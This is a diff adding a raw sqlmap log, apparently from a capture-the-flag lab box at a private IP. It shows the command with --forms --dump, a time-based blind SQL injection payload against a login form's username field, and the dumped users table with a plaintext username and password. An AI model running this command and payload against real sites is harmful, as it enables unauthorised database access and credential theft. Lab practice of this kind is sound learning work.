@@ -1,0 +1,67 @@
+sqlmap  -u http://10.10.211.192/administrator.php  --forms --dump                                                    [17:53:23]
+        ___
+       __H__
+ ___ ___[(]_____ ___ ___  {1.4.11#stable}
+|_ -| . ["]     | .'| . |
+|___|_  [,]_|_|_|__,|  _|
+      |_|V...       |_|   http://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 17:53:32 /2020-11-26/
+
+[17:53:32] [INFO] testing connection to the target URL
+[17:53:33] [INFO] searching for forms
+[#1] form:
+POST http://10.10.211.192/administrator.php
+POST data: username=&password=
+do you want to test this form? [Y/n/q] 
+> y
+Edit POST data [default: username=&password=] (Warning: blank fields detected): 
+do you want to fill blank fields with random values? [Y/n] y
+[17:53:36] [INFO] resuming back-end DBMS 'mysql' 
+[17:53:36] [INFO] using '/home/avik/.local/share/sqlmap/output/results-11262020_0553pm.csv' as the CSV results file in multiple targets mode
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: username (POST)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: username=' AND (SELECT 7678 FROM (SELECT(SLEEP(5)))okfQ) AND 'kKoN'='kKoN&password=
+---
+do you want to exploit this SQL injection? [Y/n] y
+[17:53:38] [INFO] the back-end DBMS is MySQL
+back-end DBMS: MySQL >= 5.0.12
+[17:53:38] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
+[17:53:38] [INFO] fetching current database
+[17:53:38] [INFO] resumed: users
+[17:53:38] [INFO] fetching tables for database: 'users'
+[17:53:38] [INFO] fetching number of tables for database 'users'
+[17:53:38] [INFO] resumed: 1
+[17:53:38] [WARNING] time-based comparison requires larger statistical model, please wait.............................. (done)       
+do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] y
+[17:54:42] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
+[17:54:53] [INFO] adjusting time delay to 3 seconds due to good response times
+users
+[17:55:46] [INFO] fetching columns for table 'users' in database 'users'
+[17:55:46] [INFO] retrieved: 2
+[17:55:55] [INFO] retrieved: username
+[17:57:27] [INFO] retrieved: password
+[17:59:16] [INFO] fetching entries for table 'users' in database 'users'
+[17:59:16] [INFO] fetching number of entries for table 'users' in database 'users'
+[17:59:16] [INFO] retrieved: 1
+[17:59:23] [WARNING] (case) time-based comparison requires reset of statistical model, please wait.............................. (done)
+secretpass
+[18:01:40] [INFO] retrieved: pingudad
+Database: users
+Table: users
+[1 entry]
++------------+----------+
+| password   | username |
++------------+----------+
+| secretpass | pingudad |
++------------+----------+
+
+[18:03:25] [INFO] table 'users.users' dumped to CSV file '/home/avik/.local/share/sqlmap/output/10.10.211.192/dump/users/users.csv'
+[18:03:25] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/home/avik/.local/share/sqlmap/output/results-11262020_0553pm.csv'
+
+[*] ending @ 18:03:25 /2020-11-26/
